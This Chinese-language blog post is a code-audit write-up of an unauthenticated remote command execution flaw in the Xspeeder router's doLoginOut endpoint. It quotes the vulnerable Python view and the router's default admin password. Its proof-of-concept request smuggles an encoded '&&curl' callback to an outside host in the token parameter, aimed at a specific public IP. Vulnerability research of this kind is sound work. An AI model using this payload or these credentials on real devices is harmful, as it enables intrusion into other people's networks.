---
created: 2024-10-01T07:46:00+00:00
categories:
  - 技术研究
tags:
  - 代码审计
  - RCE
updated: 2023-03-26T00:00:00+00:00
date: 2022-10-11T00:00:00+00:00
slug: xspeeder-dologinout-rce
title: 同迅神行者路由doLoginOut未授权RCE
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f8f0a2c7-bdeb-4712-96bb-6618a6f91ee5/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=60de13e023cbad8f973afcc29494535271f9fd0b68a877db5b8f59290bf87fd8&X-Amz-SignedHeaders=host&x-id=GetObject
id: 112906e1-7468-804d-ae2e-fc3ac4019fbc
---

> 引子

    某次HW期间看到该漏洞的利用，遂尝试分析一番。

## 漏洞简介

同迅神行者路由通过系统管理、网络管理、策略管理、监控统计、面板管理五大人机互动管理功能，对流经的所有应用数据进行实时监控与管理。神行者路由流控产品存在未授权命令注入漏洞，攻击者可以利用该漏洞对服务器执行任意命令。

## 固件下载分析

找到厂商官网，下载中心可以直接获取到路由固件包。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/25c68db0-4b7c-445a-ae92-ed7aa7560852/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=26ba7ecfbba1bf3bc3937a57d35a87eb971a12aaf177d44c7a3fc6499412733e&X-Amz-SignedHeaders=host&x-id=GetObject)

这里直接对 ISO 相关文件进行解压，发现 Web 目录结构如下，若要尝试搭建可以见官方文档，此外，路由默认账号密码是 admin:sxzros。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/bde6d07c-89f9-48a1-866d-a2cb8472a771/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=1ad3d72047401abe743b4b39b79d4c6762ff386b9243564bab293d2eaae3c6d6&X-Amz-SignedHeaders=host&x-id=GetObject)

## Python 代码审计

首先直接查看路由的分配，如下。

```python
# @Filename: urls.py
urlpatterns = [
	url(r'^favicon.ico$',RedirectView.as_view(url=r'static/assets/img/favicon.ico')),
   	#登录
	url(r'^$','xapp.vLogin.index'),
	url(r'^doLogin/$','xapp.vLogin.doLogin'),#登录验证
	url(r'^webInfos/$','xapp.vLogin.webInfos'),#WEB登录信息认证
	url(r'^weixinInfos/$','xapp.vLogin.weixinInfos'),#微信登录验证
	url(r'^index/$','xapp.vLogin.index'),#注销后的返回页面
	url(r'^default/$','xapp.views.default'),#缺省
	url(r'^warning/$','xapp.views.warning'),#到期提醒
	url(r'^edtPwd/$','xapp.views.edtPwd'),#密码修改
	url(r'^doLoginOut/$','xapp.views.doLoginOut'),#退出登录
	url(r'^doSyncConfigToSlave/$','xapp.views.doSyncConfigToSlave'),#主备配置同步
	url(r'^iosweixinLogin/$','xapp.views.iosweixinLogin'),#登录
	#首页
	url(r'^index/index/$','xapp.vIndex.index'),
```

对各个路由对应的方法进行排查，最终发现，在如下代码片段中，`edtPwd`和`doSyncConfigToSlave`方法都需要 token 来鉴权，但`doLoginOut`方法是没有判断 token 的，且这个方法存在`os.system`方法执行系统命令的操作。

进一步分析`doLoginOut`方法，可以判断出这个方法是登出操作，在登录成功时，是会在系统某处写一个 token 文件，而退出就是删除这个 token 文件。

```python
# @Filename: views.py
#修改密码
def edtPwd(request):
	map   = request.GET
	if not 'token' in map  or len(map['token']) != 16:
		return HttpResponseRedirect('/index/')
	spath     = r'/tmpfile/loginfile/'+str(map['token'])
	logindic  = cUtil.getLoginToken(spath)
	……
	return list
#退出
def doLoginOut(request):
	map     = request.GET
	spath   = r'/tmpfile/loginfile/'+str(map['token'])
	delfile = "rm -rf %s"%(spath)
	os.system(delfile)
	return HttpResponse(0)
#主备配置同步
def doSyncConfigToSlave(request):
	map = request.GET
	if not 'token' in map  or len(map['token']) != 16:
		return HttpResponseRedirect('/index/')
	spath     = r'/tmpfile/loginfile/'+str(map['token'])
	……
	return JsonResponse(list,safe=False)
```

## 概念验证步骤

根据如上逻辑，构造一个 POC，如下所示，成功 RCE。

```text
GET /doLoginOut/?token=%31%31%31%26%26%63%75%72%6c%20%31%62%35%65%39%34%35%38%2e%64%6e%73%2e%31%34%33%33%2e%65%75%2e%6f%72%67 HTTP/1.1
Host: 112.93.240.78:4433
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5220.146 Safari/537.36 OPR/83.0.4416.120
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close

HTTP/1.1 200 OK
Server: nginx
Date: Sun, 09 Oct 2022 10:53:55 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Frame-Options: SAMEORIGIN
Content-Length: 1

0
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c7e63b04-d4b4-4138-ab9b-d0757ffa5d4b/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=22bd0feb50ec9ae130caeb1fdc6685693d90ee7325416ff5b7d9e9844eb2c168&X-Amz-SignedHeaders=host&x-id=GetObject)
